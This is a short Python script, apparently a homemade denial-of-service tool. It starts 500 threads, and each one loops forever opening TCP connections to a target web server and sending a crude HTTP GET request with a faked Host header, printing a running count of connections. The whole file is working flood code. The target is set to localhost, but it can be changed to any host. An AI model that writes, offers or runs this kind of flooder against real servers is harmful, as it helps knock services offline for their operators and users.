import threading
import socket

target = '127.0.0.1'
port = 80
fake_ip = '182.21.20.32'

already_connected = 0
lock = threading.Lock()

def attack():
    global already_connected
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target +  "HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("HOST: " + fake_ip +  "\r\n\r\n").encode('ascii'), (target, port))
            s.close()

            with lock:
                already_connected += 1
                if already_connected % 500 == 0:
                    print(f"[+] Connections: {already_connected}")
        except Exception as e:
            pass    #Optionally log or print(e)

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
